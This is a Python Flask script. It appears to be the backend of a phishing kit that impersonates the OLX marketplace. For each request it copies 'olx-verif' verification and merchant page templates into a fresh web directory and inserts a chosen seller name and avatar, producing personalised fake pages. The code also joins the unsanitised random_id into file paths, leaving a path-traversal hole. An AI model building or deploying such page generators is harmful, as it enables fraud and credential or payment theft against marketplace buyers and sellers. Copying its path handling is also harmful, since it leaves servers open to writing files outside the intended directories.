from flask import Flask, request, jsonify
import os
import shutil
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/verif/<random_id>', methods=['POST'])
def save_page(random_id):
    seller_name_tag = request.form.get('seller_name_tag')
    avatar_url = request.form.get('avatar_url')
    current_domain = request.form.get('current_domain')

    if not seller_name_tag or not avatar_url or not current_domain:
        return jsonify({'error': 'Missing data'}), 400

    # Define paths
    page_save_path = f"/var/www/olx-verif/verif/{random_id}/index.html"
    verif_source_dir = '/home/user/services/olx-verif/verif/'
    merchant_source_dir = '/home/user/services/olx-verif/merchant/'
    verif_source_file = os.path.join(verif_source_dir, 'index.html')
    merchant_source_file = os.path.join(merchant_source_dir, 'index.html')
    verif_destination_file = os.path.join('/var/www/olx-verif/verif', random_id, 'index.html')
    merchant_destination_file = os.path.join('/var/www/olx-verif/merchant', random_id, 'index.html')

    # Create directories and copy files
    os.makedirs(os.path.dirname(page_save_path), exist_ok=True)
    if os.path.exists(verif_source_file):
        shutil.copy(verif_source_file, verif_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/verif/index.html not found'}), 404

    if os.path.exists(merchant_source_file):
        os.makedirs(os.path.dirname(merchant_destination_file), exist_ok=True)
        shutil.copy(merchant_source_file, merchant_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/merchant/index.html not found'}), 404

    # Replace the content in the file
    with open(verif_destination_file, 'r') as file:
        content = file.read()

    soup = BeautifulSoup(content, 'html.parser')
    shop_info_div = soup.find('div', class_='shop-info')

    if shop_info_div:
        img_tag = shop_info_div.find('img')
        if img_tag:
            img_tag['src'] = avatar_url

        h3_tag = shop_info_div.find('h3')
        if h3_tag:
            h3_tag.contents[0].replace_with(seller_name_tag)

    with open(verif_destination_file, 'w') as file:
        file.write(str(soup))

    return jsonify({'message': 'Page saved and files copied successfully'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
